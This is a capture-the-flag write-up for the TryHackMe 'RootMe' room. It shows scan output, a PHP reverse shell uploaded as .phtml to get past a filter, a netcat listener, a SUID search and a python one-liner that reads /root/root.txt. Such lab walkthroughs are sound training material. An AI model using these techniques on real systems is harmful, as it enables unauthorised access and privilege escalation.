Written by: Jackie Mann
Alias: whiteshd0w
TryHackMe room: https://tryhackme.com/room/rrootme

Enumerated the box as normal. You can answer all the questions in task 2 from our enumeration.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 14:14 CDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
Initiating Ping Scan at 14:14
Scanning rootme.thm (10.10.202.81) [4 ports]
Completed Ping Scan at 14:14, 0.34s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:14
Scanning rootme.thm (10.10.202.81) [1000 ports]
Discovered open port 22/tcp on 10.10.202.81
Discovered open port 80/tcp on 10.10.202.81
Increasing send delay for 10.10.202.81 from 0 to 5 due to 36 out of 118 dropped probes since last increase.
Completed SYN Stealth Scan at 14:14, 14.88s elapsed (1000 total ports)
Initiating Service scan at 14:14
Scanning 2 services on rootme.thm (10.10.202.81)
Completed Service scan at 14:14, 6.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.202.81.
Initiating NSE at 14:14
Completed NSE at 14:14, 7.11s elapsed
Initiating NSE at 14:14
Completed NSE at 14:14, 0.94s elapsed
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
Nmap scan report for rootme.thm (10.10.202.81)
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
Initiating NSE at 14:14
Completed NSE at 14:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.25 seconds
           Raw packets sent: 1092 (48.024KB) | Rcvd: 1859 (214.384KB)
```

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://rootme.thm/
[+] Threads      : 10
[+] Wordlist     : directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : html,php,txt,jpg
[+] Timeout      : 10s
=====================================================
2020/09/14 13:52:58 Starting gobuster
=====================================================
/index.php (Status: 200)
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)

```

I then went into the ```/panel``` directory of the website and found an upload form. I then uploaded a simple php reverse shell, but with the extension of .phtml as the site would not let me upload a .php file.

I issued a ```nc -lnvp 1234``` on my machine and clicked on the link to the reverse shell and was greeted with a shell as user www-data. ***NOTE: You can use any free port on your system, I just was lazy... :) ***

```
nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.202.81 35830
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:17:34 up 28 min,  0 users,  load average: 0.00, 0.01, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We were placed in the / directory so we needed to know where home was for www-data

```
cat /etc/passwd
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

So, we change into /var/www and see the user.txt flag

```
cd /var/www
ls -la
total 20
drwxr-xr-x  3 www-data www-data 4096 Aug  4 17:54 .
drwxr-xr-x 14 root     root     4096 Aug  4 15:08 ..
-rw-------  1 www-data www-data  129 Aug  4 17:54 .bash_history
drwxr-xr-x  6 www-data www-data 4096 Aug  4 17:19 html
-rw-r--r--  1 www-data www-data   21 Aug  4 17:30 user.txt
cat user.txt
THM{***_***_*_*****}
```
Now we need to figure out how to get the root.txt flag. Looking for the SUID binaries we see that our favorite scripting language has one set:
```
find / -user root -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python   <-----
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```
Using GTFObins we see a way that we can access files that we normally wouldn't be able to due to permission restrictions. 

```
python -c 'print(open("/root/root.txt").read())'  
THM{*********_**********}
```
We now have our root flag!